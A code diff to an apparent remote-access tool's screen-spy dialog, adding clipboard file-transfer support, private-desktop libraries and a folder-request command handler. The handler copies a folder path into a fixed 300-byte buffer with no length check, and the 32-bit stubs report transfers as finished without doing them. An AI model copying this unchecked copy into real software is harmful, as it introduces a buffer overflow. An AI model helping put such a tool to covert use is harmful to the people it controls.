@@ -9,6 +9,7 @@
 #include <WinUser.h>
 #include "CGridDialog.h"
 #include "2015RemoteDlg.h"
+#include <file_upload.h>
 
 
 // CScreenSpyDlg 对话框
@@ -28,6 +29,29 @@ enum {
 IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)
 
 #define ALGORITHM_DIFF 1
+
+#ifdef _WIN64
+#ifdef _DEBUG
+#pragma comment(lib, "FileUpload_Libx64d.lib")
+#pragma comment(lib, "PrivateDesktop_Libx64d.lib")
+#else
+#pragma comment(lib, "FileUpload_Libx64.lib")
+#pragma comment(lib, "PrivateDesktop_Libx64.lib")
+#endif
+#else
+int InitFileUpload(const std::string hmac, int chunkSizeKb, int sendDurationMs) { return 0; }
+int UninitFileUpload() { return 0; }
+std::vector<std::string> GetClipboardFiles() { return{}; }
+bool GetCurrentFolderPath(std::string& outDir) { return false; }
+int FileBatchTransferWorker(const std::vector<std::string>& files, const std::string& targetDir,
+	void* user, OnTransform f, OnFinish finish, const std::string& hash, const std::string& hmac) {
+	finish(user);
+	return 0;
+}
+int RecvFileChunk(char* buf, size_t len, void* user, OnFinish f, const std::string& hash, const std::string& hmac) {
+	return 0;
+}
+#endif
 
 extern "C" void* x265_api_get_192()
 {
@@ -233,12 +257,23 @@ VOID CScreenSpyDlg::OnClose()
     DialogBase::OnClose();
 }
 
-
 VOID CScreenSpyDlg::OnReceiveComplete()
 {
     assert (m_ContextObject);
     auto cmd = m_ContextObject->InDeCompressedBuffer.GetBYTE(0);
+	LPBYTE szBuffer = m_ContextObject->InDeCompressedBuffer.GetBuffer();
+	unsigned len = m_ContextObject->InDeCompressedBuffer.GetBufferLen();
     switch(cmd) {
+	case COMMAND_GET_FOLDER: {
+		std::string folder;
+		if (GetCurrentFolderPath(folder)) {
+            // 发送目录并准备接收文件
+			BYTE cmd[300] = { COMMAND_GET_FILE };
+			memcpy(cmd + 1, folder.c_str(), folder.length());
+			m_ContextObject->Send2Client(cmd, sizeof(cmd));
+		}
+		break;
+	}
     case TOKEN_FIRSTSCREEN: {
         DrawFirstScreen();
         break;
